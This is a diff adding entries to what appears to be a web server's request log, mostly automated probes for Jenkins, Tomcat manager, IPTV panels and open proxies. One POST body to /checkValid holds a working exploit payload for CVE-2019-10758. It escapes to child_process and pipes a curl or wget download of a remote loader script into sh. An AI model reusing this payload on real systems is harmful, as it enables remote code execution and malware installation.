@@ -1374,3 +1374,30 @@ GET / -  {}
 GET / -  {}
 GET / -  {}
 GET / -  {}
+GET / -  {}
+HEAD http://112.124.42.80:63435/ -  {}
+GET /app/common.js?version=2.4.43&build=1563436823 -  {}
+GET /recordings/misc/recording_popup.php -  {}
+GET /cloud-app/include/css/uncall.css -  {}
+GET /checkValid -  {}
+POST /checkValid -  {
+  document: 'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("(curl --user-agent cve_2019_10758 http://194.145.227.21/ldr.sh||wget --user-agent cve_2019_10758 -q -O - http://194.145.227.21/ldr.sh)|sh")'
+}
+HEAD http://110.242.68.4/ -  {}
+GET /login -  {}
+GET /jenkins/login -  {}
+GET / -  {}
+GET /manager/html -  {}
+HEAD / -  {}
+GET /system_api.php -  {}
+GET /system_api.php -  {}
+GET /c/version.js -  {}
+GET /streaming/clients_live.php -  {}
+GET /stalker_portal/c/version.js -  {}
+GET /client_area/ -  {}
+GET /stalker_portal/c/ -  {}
+GET /stream/rtmp.php -  {}
+GET / -  {}
+GET / -  {}
+GET / -  {}
+GET / -  {}
